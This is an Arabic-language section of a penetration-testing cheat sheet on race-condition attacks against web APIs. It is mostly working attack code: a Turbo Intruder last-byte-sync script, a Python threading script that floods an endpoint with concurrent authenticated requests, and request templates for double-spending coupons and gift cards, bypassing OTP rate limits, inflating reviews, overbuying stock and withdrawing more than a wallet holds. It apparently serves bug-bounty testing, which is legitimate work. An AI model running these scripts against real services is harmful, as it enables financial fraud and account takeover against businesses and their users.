## 6. RACE CONDITIONS

### Turbo Intruder — Last-Byte Sync (أقوى طريقة)

أرسل 20 طلب بنفس اللحظة باستخدام حزمة TCP واحدة:

```python
# Burp → Extensions → BApp Store → Turbo Intruder
# الصق هذا في Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=10,
                           pipeline=True)

    # Last-Byte Sync — كل الطلبات ترسل آخر بايت بنفس اللحظة
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # يفتح البوابة فجأة
    engine.complete(timeout=5)

def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

**سيناريوهات الـ Race المشهورة:**

### 1. Double-Spend (كوبون / رصيد)
```python
# استخدم Turbo Intruder أعلاه على:
POST /api/redeem-coupon
{"code": "PROMO50"}

# التحقق: Check account balance قبل وبعد
# لو الخصم أكثر من مرة = Race condition confirmed
```

### 2. Rate Limit Bypass
```bash
# لو السيرفر يسمح 3 محاولات OTP كل 60 ثانية
# أرسل 20 طلب verify بنفس اللحظة — غالباً 20-30% يجتاز
# لأن counter ما يزود بين check و increment
```

### 3. Multiple Review / Rating Submit
```bash
POST /api/review
{"product_id": 123, "rating": 5}
# Turbo Intruder → أرسل 10 طلب
# لو المنتج صار له 10 تقييمات = rating manipulated
```

### 4. Gift Card Redemption
```bash
POST /api/gift-card/redeem
{"code": "GC-XXXX-YYYY"}
# نفس pattern الـ double-spend
# تحقق: رصيدك ازداد مرتين
```

### 5. Limited Stock Purchase
```bash
POST /api/cart/checkout
{"item_id": 456, "quantity": 1}
# أرسل 10 طلبات check-out بنفس اللحظة
# لو اشتريت 10 قطع من مخزون 5 = Race on stock
```

### 6. Race on Wallet Withdrawal
```bash
POST /api/wallet/withdraw
{"amount": 100}
# إذا السيرفر يفحص الرصيد قبل الخصم
# 10 طلبات مع بعض = سحب 1000 من رصيد 100
```

### الكلاسيك — Threading بالبايثون
```python
import threading, requests

url = "https://target.com/api/action"
data = {"some": "data"}
headers = {"Authorization": "Bearer TOKEN"}

def attack():
    r = requests.post(url, json=data, headers=headers)
    print(r.status_code, r.text[:100])

threads = [threading.Thread(target=attack) for _ in range(30)]
for t in threads: t.start()
for t in threads: t.join()
```

### تأكيد الـ Finding

```
[ ] قبل السباق: سجل الحالة (الرصيد / الكوبون / المخزون)
[ ] شغل Turbo Intruder أو threading
[ ] بعد السباق: هل الحالة تغيرت أكثر من مرة؟
[ ] لو dirty state = CONFIRMED
[ ] لو كل الطلبات رجعت نفس النتيجة الطبيعية = NOT VULN
[ ] اختبر 3 مرات للتأكد
```
